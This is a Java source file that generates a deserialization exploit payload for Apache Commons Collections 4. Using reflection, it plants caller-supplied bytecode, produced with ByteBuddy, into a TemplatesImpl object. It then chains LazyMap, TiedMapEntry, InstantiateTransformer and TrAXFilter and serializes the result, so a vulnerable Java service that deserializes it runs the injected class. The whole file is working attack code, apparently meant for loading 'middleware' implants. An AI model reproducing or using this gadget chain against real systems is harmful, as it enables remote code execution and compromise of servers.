package ccdr4gon;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import net.bytebuddy.ByteBuddy;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsK1_1_For_CC4 {

    public CommonsCollectionsK1_1_For_CC4(){

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getPayload(String middleware) throws Exception {
        Class clazz=Class.forName(middleware);
        byte[] code= new ByteBuddy()
                .redefine(clazz)
                .name(clazz.getName())
                .make()
                .getBytes();
        System.out.println(clazz.getName());
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][] {code});
        setFieldValue(obj,"_name","");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
//        setFieldValue(obj,"namesArray", new String[]{"1"});
        InstantiateTransformer i=new InstantiateTransformer
                (
                        new Class[] { Templates.class },
                        new Object[] { obj }
                );
        Map originalMap  = new HashMap();
        Map decoratedMap = LazyMap.lazyMap(originalMap , i);
        Map fakedecoratedMap=LazyMap.lazyMap(originalMap, new ConstantTransformer("1"));
        TiedMapEntry tme = new TiedMapEntry(fakedecoratedMap,TrAXFilter.class);
        Map enterpointMap = new HashMap();
        enterpointMap.put(tme, "valuevalue");
        decoratedMap.clear();
        setFieldValue(tme,"map",decoratedMap);
        //  序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(enterpointMap);
        return baos.toByteArray();
    }
}
